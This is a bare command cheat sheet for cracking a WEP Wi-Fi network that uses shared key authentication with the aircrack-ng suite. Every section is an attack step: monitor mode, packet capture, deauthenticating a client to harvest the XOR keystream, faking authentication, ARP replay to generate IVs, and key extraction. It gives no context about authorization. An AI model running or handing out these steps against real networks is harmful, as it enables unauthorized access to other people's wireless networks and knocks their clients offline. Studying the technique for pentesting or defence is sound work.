 **Start Interface**  
```bash
airmon-ng start <interface> <AP channel>  
```  
  
**Start Dump Capture**  
```bash
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface> 
```
  
**Deauthenticate connected Client to get PRGA XOR keystream**  
```bash
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>  
```
  
**Fake Shared Key Authentication using XOR file**  
```bash
aireplay-ng -1 0 -e <ESSID> -y <keystream file> -a <AP MAC> -h <Your MAC> <interface>  
```
  
**Launch ARP request replay attack**  
```bash
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>  
```
  
**Deauthenticate connected Client**  
```bash
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>  
```  
  
**Extract Key from Capture after enough IVs have been generated**
```bash
aircrack-ng <capture>
```